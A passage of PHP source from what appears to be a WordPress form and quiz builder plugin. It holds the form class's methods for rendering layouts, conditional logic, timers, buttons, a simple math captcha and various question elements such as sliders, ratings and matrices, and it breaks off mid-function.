		</div>
		<div class="ui-widget-content ui-corner-all">
			<p><?php _e( 'We faced problems while connecting to the server or receiving data from the server. Please wait for a few seconds and try again.', 'ipt_fsqm' ); ?></p>
			<p><?php _e( 'If the problem persists, then check your internet connectivity. If all other sites open fine, then please contact the administrator of this website with the following information.', 'ipt_fsqm' ); ?></p>
			<p class="jqXHR">
				<strong><?php _e( 'TextStatus: ', 'ipt_fsqm' ) ?></strong><span class="textStatus"><?php _e( 'undefined', 'ipt_fsqm' ) ?></span><br />
				<strong><?php _e( 'HTTP Error: ', 'ipt_fsqm' ) ?></strong><span class="errorThrown"><?php _e( 'undefined', 'ipt_fsqm' ) ?></span>
			</p>
		</div>
	</div>
	<div style="display: none" class="ipt_uif_widget_box ipt_fsqm_form_message_process">
		<div class="ui-widget ui-widget-header ui-corner-all">
			<?php $this->ui->ajax_loader( false, '', array(), true, $this->settings['submission']['process_title'] ); ?>
		</div>
	</div>
	<?php endif; ?>

	<?php if ( isset( $timer->type ) && $timer->type != 'none' ) : ?>
	<div class="ipt_fsqm_timer fixed"><div class="ipt_fsqm_timer_inner"></div></div>
	<div class="ipt_fsqm_timer_spacer"></div>
	<?php endif; ?>
<?php if ( $print_container ) : ?>
</div>
<?php endif; ?>
		<?php
	}

	public function populate_layout( $layout_key, $layout, $make_wrapper = true ) {
?>
<?php if ( $make_wrapper ) : ?>
<div id="<?php echo 'ipt_fsqm_form_' . $this->form_id . '_layout_' . $layout_key; ?>_inner" class="ipt_uif_column_full ipt_uif_column">
	<?php if ( $this->type != 1 ) : ?>
	<?php $this->ui->column_head( '', 'full', false, array( 'ipt_fsqm_main_heading_column' ) ); ?>
	<?php if ( trim( $layout['title'] ) != '' ) : ?>
	<?php $this->ui->heading( $layout['title'] . '<span class="subtitle">' . $layout['subtitle'] . '</span>', 'h2', 'center', $layout['icon'], false, true, array( 'ipt_fsqm_main_heading' ) ); ?>
	<?php endif; ?>
	<?php $this->ui->column_tail(); ?>
	<?php endif; ?>
	<?php if ( isset( $layout['description'] ) && $layout['description'] != '' ) : ?>
	<?php $this->ui->column_head( '', 'full', true ); ?>
	<?php echo apply_filters( 'ipt_uif_richtext', $layout['description'] ); ?>
	<?php $this->ui->column_tail(); ?>
	<?php endif; ?>
<?php endif; ?>
	<?php foreach ( (array) $layout['elements'] as $layout_element ) : ?>
	<?php $this->tamper_protection( $layout_element ); ?>
	<?php $element = $layout_element['type']; $key = $layout_element['key']; $element_data = $this->get_element_from_layout( $layout_element ); $submission_data = $this->get_submission_from_data( $layout_element ); ?>
	<?php $this->build_element_html( $element, $key, $element_data, $submission_data, 'ipt_fsqm_form_' . $this->form_id ); ?>
	<?php endforeach; ?>
<?php if ( $make_wrapper ) : ?>
</div>
<?php endif; ?>
		<?php
	}

	public function populate_conditional_logic() {
		$logics = array();
		$indexes = array();

		// Loop through containers
		foreach ( $this->layout as $l_key => $layout ) {
			if ( isset( $layout['conditional'] ) && is_array( $layout['conditional'] ) ) {
				if ( $layout['conditional']['active'] == false ) {
					continue;
				}
				$this->process_logic( $layout, $l_key, $logics );
				$this->process_index( $layout, $l_key, $indexes );
			}
		}

		// Loop through design elements
		foreach ( $this->design as $d_key => $design ) {
			if ( isset( $design['conditional'] ) && is_array( $design['conditional'] ) ) {
				if ( $design['conditional']['active'] == false ) {
					continue;
				}
				$this->process_logic( $design, $d_key, $logics );
				$this->process_index( $design, $d_key, $indexes );
			}
		}

		// Loop through freetype elements
		foreach ( $this->freetype as $f_key => $freetype ) {
			if ( isset( $freetype['conditional'] ) && is_array( $freetype['conditional'] ) ) {
				if ( $freetype['conditional']['active'] == false ) {
					continue;
				}
				$this->process_logic( $freetype, $f_key, $logics );
				$this->process_index( $freetype, $f_key, $indexes );
			}
		}

		// Loop through mcq elements
		foreach ( $this->mcq as $m_key => $mcq ) {
			if ( isset( $mcq['conditional'] ) && is_array( $mcq['conditional'] ) ) {
				if ( $mcq['conditional']['active'] == false ) {
					continue;
				}
				$this->process_logic( $mcq, $m_key, $logics );
				$this->process_index( $mcq, $m_key, $indexes );
			}
		}

		// Loop through pinfo
		foreach ( $this->pinfo as $p_key => $pinfo ) {
			if ( isset( $pinfo['conditional'] ) && is_array( $pinfo['conditional'] ) ) {
				if ( $pinfo['conditional']['active'] == false ) {
					continue;
				}
				$this->process_logic( $pinfo, $p_key, $logics );
				$this->process_index( $pinfo, $p_key, $indexes );
			}
		}

		// Button Logic
		if ( isset( $this->settings['buttons']['conditional'] ) && $this->settings['buttons']['conditional']['active'] == true ) {
			$button_id = 'ipt_fsqm_form_' . $this->form_id . '_button_submit';
			$button_conditional = (object) $this->settings['buttons']['conditional'];
			$button_conditional_logic = array();
			foreach ( (array) $this->settings['buttons']['conditional']['logic'] as $blogic ) {
				$button_conditional_logic[] = (object) $blogic;
				$bindex_key = 'ipt_fsqm_form_' . $this->form_id . '_' . $blogic['m_type'] . '_' . $blogic['key'];
				if ( ! isset( $indexes[$bindex_key] ) ) {
					$indexes[$bindex_key] = array();
				}
				$indexes[$bindex_key][] = $button_id;
			}
			$button_conditional->logic = (object) $button_conditional_logic;
			$logics[$button_id] = $button_conditional;
		}

		return array(
			'logics' => $logics,
			'indexes' => $indexes,
			'base' => $this->form_id,
		);
	}

	protected function process_logic( $element, $key, &$logics ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element['m_type'] . '_' . $key;
		// Set the control li for layout elements
		if ( $element['m_type'] == 'layout' ) {
			if ( $this->type == '0' ) {
				$id = 'ipt_fsqm_form_' . $this->form_id . '_layout_' . $key . '_inner';
			} else {
				$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element['type'] . '_' . $key . '_control_li';
			}
		}
		if ( ! isset( $logics[$id] ) ) {
			// Make the conditional logic objects, otherwise will lose order
			$conditional = $element['conditional'];
			$conditional_logic = array();
			foreach ( $conditional['logic'] as $logic ) {
				$conditional_logic[] = $logic;
			}
			$conditional = (object) $conditional;
			$conditional->logic = (object) $conditional_logic;

			$logics[$id] = $conditional;
			$logics[$id]->type = $element['type'];
			$logics[$id]->m_type = $element['m_type'];
		}
	}

	protected function process_index( $element, $key, &$indexes ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element['m_type'] . '_' . $key;
		// Set the control li for layout elements
		if ( $element['m_type'] == 'layout' ) {
			if ( $this->type == '0' ) {
				$id = 'ipt_fsqm_form_' . $this->form_id . '_layout_' . $key . '_inner';
			} else {
				$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element['type'] . '_' . $key . '_control_li';
			}
		}
		if ( isset( $element['conditional']['logic'] ) ) {
			foreach ( (array) $element['conditional']['logic'] as $logic ) {
				$index_key = 'ipt_fsqm_form_' . $this->form_id . '_' . $logic['m_type'] . '_' . $logic['key'];
				if ( ! isset( $indexes[$index_key] ) ) {
					$indexes[$index_key] = array();
				}
				$indexes[$index_key][] = $id;
			}
		}
	}

	public function populate_timer() {
		$timer = array(
			'type' => 'none',
		);
		// Only if not admin functions
		// And submission is enabled
		if ( ! $this->doing_admin && $this->can_submit ) {
			if ( $this->settings['timer']['time_limit_type'] != 'none' ) {
				switch ( $this->settings['timer']['time_limit_type'] ) {
					case 'overall' :
						$timer = array(
							'type' => 'overall',
							'time' => $this->settings['timer']['overall_limit'],
						);
						break;

					case 'page_specific' :
						$timer = array(
							'type' => 'page_specific',
							'time' => array(),
						);
						foreach ( $this->layout as $l_key => $layout ) {
							$timer['time'][$l_key] = $layout['timer'];
						}
						$timer['time'] = (object) $timer['time'];
						break;

					default :
					case 'none' :
						$timer['type'] = 'none';
						break;
				}
			}
		}

		return (object) $timer;
	}

	public function submit_buttons() {
		$buttons = array();
		if ( count( $this->layout ) > 1 && $this->type != '0' ) {
			$buttons[0] = array(
				'text' => $this->settings['buttons']['prev'],
				'name' => 'ipt_fsqm_form_' . $this->form_id . '_button_prev',
				'size' => 'small',
				'style' => 'primary',
				'state' => 'normal',
				'classes' => array( 'ipt_fsqm_form_button_prev' ),
				'type' => 'button',
			);
			$buttons[2] = array(
				'text' => $this->settings['buttons']['next'],
				'name' => 'ipt_fsqm_form_' . $this->form_id . '_button_next',
				'size' => 'small',
				'style' => 'primary',
				'state' => 'normal',
				'classes' => array( 'ipt_fsqm_form_button_next' ),
				'type' => 'button',
			);
		}
		$buttons[1] = array(
			'text' => $this->settings['buttons']['submit'],
			'name' => 'ipt_fsqm_form_' . $this->form_id . '_button_submit',
			'size' => 'small',
			'style' => 'primary',
			'state' => 'normal',
			'classes' => array( 'ipt_fsqm_form_button_submit' ),
			'type' => 'submit',
		);
		if ( $this->settings['buttons']['reset'] != '' ) {
			$buttons[] = array(
				'text' => '<i class="ipticm ipt-icomoon-refresh"></i>',
				'name' => 'ipt_fsqm_form_' . $this->form_id . '_button_reset',
				'size' => 'small',
				'style' => 'primary',
				'state' => 'normal',
				'classes' => array( 'ipt_fsqm_form_button_reset ipt_uif_tooltip' ),
				'type' => 'reset',
				'data' => array(),
				'atts' => array(
					'title' => $this->settings['buttons']['reset'],
				),
			);
		}
		ksort( $buttons );
		$buttons = apply_filters( 'ipt_fsqm_form_progress_buttons', $buttons );
		$this->ui->buttons( $buttons, 'ipt_fsqm_form_' . $this->form_id . '_button_container', 'ipt_fsqm_form_button_container' );
	}

	/*  ==========================================================================
	 * DEFAULT ELEMENTS - OVERRIDE
	 *========================================================================*/
	public function build_heading( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', false, 'ipt_fsqm_container_heading' );
?>
<?php $this->ui->heading( $element_data['title'], $element_data['settings']['type'], $element_data['settings']['align'], $element_data['settings']['icon'], $element_data['settings']['show_top'] ); ?>
		<?php
		$this->ui->column_tail();
	}

	public function build_richtext( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', 'ipt_fsqm_container_richtext' );
?>
<?php $this->ui->heading( $element_data['title'], 'h2', 'left', $element_data['settings']['icon'] ); ?>
<div class="ipt_uif_richtext">
	<?php echo apply_filters( 'ipt_uif_richtext', $element_data['description'] ); ?>
	<?php $this->ui->clear(); ?>
</div>
		<?php
		$this->ui->column_tail();
	}

	public function build_embed( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_embed' );
?>
<div class="ipt_fsqm_embed">
	<?php echo $element_data['description']; ?>
</div>
		<?php
		$this->ui->column_tail();
	}

	public function build_collapsible( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_collapsible' );
		$params = array( $key, $element_data, false );
		$this->ui->container( array( array( $this, 'populate_layout' ), $params ), $element_data['title'], $element_data['settings']['icon'], true, $element_data['settings']['expanded'], '' );
		$this->ui->column_tail();
	}

	public function build_container( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_container' );
		$params = array( $key, $element_data, false );
		$this->ui->container( array( array( $this, 'populate_layout' ), $params ), $element_data['title'], $element_data['settings']['icon'], false, true, '' );
		$this->ui->column_tail();
	}

	public function build_blank_container( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', false, 'ipt_fsqm_container_blank_container' );
		$params = array( $key, $element_data, false );
		$this->ui->div( 'ipt_uif_blank_container', array( array( $this, 'populate_layout' ), $params ) );
		$this->ui->column_tail();
	}

	public function build_iconbox( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_iconbox' );
		$this->ui->iconmenu( $element_data['settings']['elements'], $element_data['settings']['align'] );
		$this->ui->column_tail();
	}

	public function build_col_half( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'half', false, 'ipt_fsqm_container_col_half' );
		$this->populate_layout( $key, $element_data, false );
		$this->ui->column_tail();
	}

	public function build_col_third( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'third', false, 'ipt_fsqm_container_col_third' );
		$this->populate_layout( $key, $element_data, false );
		$this->ui->column_tail();
	}

	public function build_col_two_third( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'two_third', false, 'ipt_fsqm_container_col_two_third' );
		$this->populate_layout( $key, $element_data, false );
		$this->ui->column_tail();
	}

	public function build_col_forth( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'forth', false, 'ipt_fsqm_container_col_forth' );
		$this->populate_layout( $key, $element_data, false );
		$this->ui->column_tail();
	}

	public function build_col_three_forth( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'three_forth', false, 'ipt_fsqm_container_col_three_forth' );
		$this->populate_layout( $key, $element_data, false );
		$this->ui->column_tail();
	}

	public function build_clear( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$this->ui->clear();
	}

	public function build_horizontal_line( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', false, 'ipt_fsqm_container_horizontal_line' );
		$this->ui->divider( '', 'div', 'center', 'none', $element_data['settings']['show_top'] );
		$this->ui->column_tail();
	}

	public function build_divider( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', false, 'ipt_fsqm_container_divider' );
		$this->ui->divider( $element_data['title'], 'div', $element_data['settings']['align'], $element_data['settings']['icon'], $element_data['settings']['show_top'] );
		$this->ui->column_tail();
	}

	public function build_button( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_button' );
		$this->ui->anchor_button( $element_data['title'], $element_data['url'], $element_data['new_tab'] == true ? '_blank' : '_self', $element_data['settings']['size'], $element_data['settings']['icon'] );
		$this->ui->column_tail();
	}

	public function build_imageslider( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_imageslider' );
		$data = array(
			'autoslide' => $element_data['settings']['autoslide'],
			'duration' => $element_data['settings']['duration'],
			'transition' => $element_data['settings']['transition'],
			'animation' => $element_data['settings']['animation'],
		);
		$images = $element_data['settings']['images'];
		$id = 'ipt_fsqm_slider_' . $this->form_id . $key;
		$this->ui->imageslider( $id, $images, $data );
		$this->ui->column_tail();
	}

	public function build_captcha( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		if ( $this->data_id != null ) {
			return;
		}
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_captcha' );
		$num1 = rand( 1, 10 );
		$num2 = rand( 1, 10 );
		$sum = $num1 + $num2;
		$hashed = $this->encrypt( $sum );
?>
<input type="hidden" name="<?php echo esc_attr( $name_prefix ); ?>[hash]" value="<?php echo esc_attr( $hashed ); ?>" />
		<?php
		$title = sprintf( __( '%d plus %d equals?', 'ipt_fsqm' ), $num1, $num2 );
		$subtitle = __( 'Prove you are a human', 'ipt_fsqm' );
		$data = array(
			'sum' => $sum,
		);
		$validation = array(
			'required' => true,
			'funccall' => 'ipt_uif_front_captcha'
		);
		$params = array( $name_prefix . '[value]', '', __( 'Write here', 'ipt_fsqm' ), 'calculate', 'normal', array(), $validation, $data );
		$this->ui->question_container( $name_prefix . '[value]', $title, $subtitle, array( array( $this->ui, 'text' ), $params ), true );
		$this->ui->column_tail();
	}

	public function build_radio( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_radio' );
		$this->make_mcqs( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure );
		$this->ui->column_tail();
	}

	public function build_checkbox( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_checkbox' );
		$this->make_mcqs( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure );
		$this->ui->column_tail();
	}

	public function build_select( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_select' );
		$this->make_mcqs( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure );
		$this->ui->column_tail();
	}

	public function build_thumbselect( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_select' );
		$items = array();
		foreach ( (array) $element_data['settings']['options'] as $o_key => $option ) {
			$items[] = array(
				'label' => $option['label'],
				'value' => (string) $o_key,
				'image' => $option['image'],
				'data' => array(
					'num' => $option['num'],
				),
			);
		}
		$param = array( $name_prefix . '[options][]', $items, $submission_data['options'], $element_data['settings']['multiple'], $element_data['validation'], $element_data['settings']['width'], $element_data['settings']['height'], $element_data['settings']['show_label'], false, false, $element_data['settings']['icon'] );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'thumbnail_select' ), $param ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_slider( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_slider' );
		$params = array( $name_prefix . '[value]', $submission_data['value'], $element_data['settings']['show_count'], $element_data['settings']['min'], $element_data['settings']['max'], $element_data['settings']['step'], $element_data['settings']['prefix'], $element_data['settings']['suffix'] );
		$this->ui->question_container( $name_prefix . '[value]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'slider' ), $params ), true, false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_range( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_range' );
		$params = array( $name_prefix . '[values]', $submission_data['values'], $element_data['settings']['show_count'], $element_data['settings']['min'], $element_data['settings']['max'], $element_data['settings']['step'], $element_data['settings']['prefix'], $element_data['settings']['suffix'] );
		$this->ui->question_container( $name_prefix . '[values]', $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'slider_range' ), $params ), true, false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_spinners( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_spinners' );
		$spinners = array();
		foreach ( $element_data['settings']['options'] as $sp_key => $sp_option ) {
			// backward compatibility with v-2.5.0
			if ( ! is_array( $sp_option ) ) {
				$sp_option = array(
					'label' => $sp_option,
				);
			}
			foreach ( array( 'min', 'max', 'step' ) as $ovkey ) {
				if ( ! isset( $sp_option[$ovkey] ) || $sp_option[$ovkey] == '' ) {
					$sp_option[$ovkey] = $element_data['settings'][$ovkey];
				}
			}
			$sp_title = $sp_option['label'];
			$spinners[] = array(
				'name' => $name_prefix . '[options][' . $sp_key . ']',
				'value' => isset( $submission_data['options'][$sp_key] ) ? $submission_data['options'][$sp_key] : $sp_option['min'],
				'placeholder' => __( 'Enter a number', 'ipt_fsqm' ),
				'min' => $sp_option['min'],
				'max' => $sp_option['max'],
				'step' => $sp_option['step'],
				'title' => $sp_option['label'],
				'required' => $element_data['validation']['required'],
			);
		}
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'spinners' ), array( $spinners ) ), $element_data['validation']['required'], true, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_grading( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_grading' );
		$type = $element_data['settings']['range'] == true ? 'range' : 'single';
		$sliders = array();
		foreach ( $element_data['settings']['options'] as $sl_key => $sl_option ) {
			if ( ! is_array( $sl_option ) ) {
				// backward compatibility -2.4.0
				$sl_option = array(
					'label' => $sl_option,
					'prefix' => '',
					'suffix' => '',
				);
			}
			foreach ( array( 'min', 'max', 'step' ) as $ovkey ) {
				if ( ! isset( $sl_option[$ovkey] ) ) {
					$sl_option[$ovkey] = '';
				}
			}
			$sliders[] = array(
				'name' => $name_prefix . '[options][' . $sl_key . ']',
				'value' => isset( $submission_data['options'][$sl_key] ) ? $submission_data['options'][$sl_key] : '',
				'title' => $sl_option['label'],
				'type' => $type,
				'prefix' => $sl_option['prefix'],
				'suffix' => $sl_option['suffix'],
				'min' => $sl_option['min'],
				'max' => $sl_option['max'],
				'step' => $sl_option['step'],
			);
		}
		$params = array( $name_prefix, $sliders, $element_data['settings']['show_count'], $element_data['settings']['min'], $element_data['settings']['max'], $element_data['settings']['step'] );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'sliders' ), $params ), true, true, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_smileyrating( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_smileyrating' );
		$enabled = (array) $element_data['settings']['enabled'];
		$data_attr = array();
		foreach ( (array) $element_data['settings']['num'] as $key => $val ) {
			if ( $val != '' ) {
				$data_attr[$key] = array(
					'num' => $val,
				);
			}
		}
		$feedback_placeholder = $element_data['settings']['feedback_label'];
		$param = array( $name_prefix . '[option]', $submission_data['option'], $enabled, $element_data['validation']['required'], $element_data['settings']['labels'], array(), $data_attr, $element_data['settings']['show_feedback'], $name_prefix . '[feedback]', $submission_data['feedback'], $feedback_placeholder );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'smiley_rating' ), $param ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_starrating( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_starrating' );
		$ratings = array();
		foreach ( $element_data['settings']['options'] as $r_key => $r_title ) {
			$ratings[] = array(
				'name' => $name_prefix . '[options][' . $r_key . ']',
				'value' => isset( $submission_data['options'][$r_key] ) ? $submission_data['options'][$r_key] : '',
				'max' => $element_data['settings']['max'],
				'required' => $element_data['validation']['required'],
				'title' => $r_title,
			);
		}
		$param = array( $ratings, 'star' );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'ratings' ), $param ), $element_data['validation']['required'], true, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_scalerating( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_scalerating' );
		$ratings = array();
		foreach ( $element_data['settings']['options'] as $r_key => $r_title ) {
			$ratings[] = array(
				'name' => $name_prefix . '[options][' . $r_key . ']',
				'value' => isset( $submission_data['options'][$r_key] ) ? $submission_data['options'][$r_key] : '',
				'max' => $element_data['settings']['max'],
				'required' => $element_data['validation']['required'],
				'title' => $r_title,
			);
		}
		$param = array( $ratings, 'scale' );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'ratings' ), $param ), $element_data['validation']['required'], true, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_matrix( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_matrix' );
		$params = array( $name_prefix, $element_data['settings']['rows'], $element_data['settings']['columns'], $submission_data['rows'], $element_data['settings']['multiple'], $element_data['validation']['required'], $element_data['settings']['icon'] );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'matrix' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_matrix_dropdown( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_matrix_dropdown' );
		$items = array();
		if ( $element_data['settings']['empty'] != '' ) {
			$items[] = array(
				'label' => $element_data['settings']['empty'],
				'value' => '',
			);
		}
		foreach ( $element_data['settings']['options'] as $o_key => $option ) {
			$items[] = array(
				'label' => $option['label'],
				'value' => (string) $o_key,
				'data'  => array(
					'num' => $option['num'],
				),
			);
		}
		$params = array( $name_prefix, $element_data['settings']['rows'], $element_data['settings']['columns'], $items, $submission_data['rows'], $element_data['validation'] );
		$this->ui->question_container( $name_prefix, $element_data['title'], $element_data['subtitle'], array( array( $this->ui, 'matrix_select' ), $params ), $element_data['validation']['required'], false, $element_data['settings']['vertical'], $element_data['description'] );
		$this->ui->column_tail();
	}

	public function build_likedislike( $element_definition, $key, $element_data, $element_structure, $name_prefix, $submission_data, $submission_structure, $context ) {
		$id = 'ipt_fsqm_form_' . $this->form_id . '_' . $element_structure['m_type'] . '_' . $key;
		$this->ui->column_head( $id, 'full', true, 'ipt_fsqm_container_likedislike' );
		$feedback_placeholder = $element_data['settings']['feedback_label'];
		$value = $submission_data['value'];
		if ( $this->data_id == null ) {
			if ( $element_data['settings']['liked'] == true ) {
				$value = 'like';
			}
		}
		$param = array( $name_prefix . '[value]', array(
			'like' => $element_data['settings']['like'],
			'dislike' => $element_data['settings']['dislike'],
		), array(
			'like' => 'like',
			'dislike' => 'dislike',
		), $value, $element_data['validation']['required'], array(), array(), $element_data['settings']['show_feedback'], $name_prefix . '[feedback]', $submission_data['feedback'], $feedback_placeholder );
